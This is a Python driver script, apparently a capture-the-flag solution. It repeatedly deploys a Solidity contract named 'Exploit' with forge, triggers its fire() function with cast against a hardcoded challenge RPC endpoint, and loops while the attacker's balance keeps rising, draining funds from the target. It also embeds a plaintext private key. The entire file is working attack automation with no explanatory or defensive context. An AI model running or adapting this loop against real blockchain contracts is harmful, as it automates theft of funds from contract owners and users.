import subprocess
from check_balance import check_balance

if __name__ == "__main__":
    while True:
        create_cmdline = [
            "forge", "create", "Exploit",
            "--rpc-url", "https://realworld.chainlight.io/da-rw1/rpc/da-rw1_2111_a7076ac760d14b3c10c3e00b38a68366915e29b32b464c537fb557d36b2eff3d",
            "--private-key", "0x16c22a7571b57b4b5e46ddbbd3b4bd6d698db267073b4765ee25cda3b2d30789", "--legacy"
        ]
        out = subprocess.check_output(create_cmdline)
        needle1 = b"Deployed to: "
        needle2 = b"Transaction hash:"
        begin = out.find(needle1) + len(needle1)
        end = out.find(needle2)
        address_str = out[begin:end].decode().strip()
        print("[+] Exploit deployed to {}".format(address_str))

        send_cmdline = [
            "cast", "send", address_str,
            "fire() returns (address, uint256)" ,
            "--rpc-url", "https://realworld.chainlight.io/da-rw1/rpc/da-rw1_2111_a7076ac760d14b3c10c3e00b38a68366915e29b32b464c537fb557d36b2eff3d",
            "--private-key", "0x16c22a7571b57b4b5e46ddbbd3b4bd6d698db267073b4765ee25cda3b2d30789", "--legacy"
        ]
        oldBalance = check_balance()
        out = subprocess.check_output(send_cmdline)
        newBalance = check_balance()
        if newBalance > oldBalance:
            print("[+] Balance increased: {} --> {}".format(oldBalance, newBalance))
        else:
            print("[*] Exploit done")
            break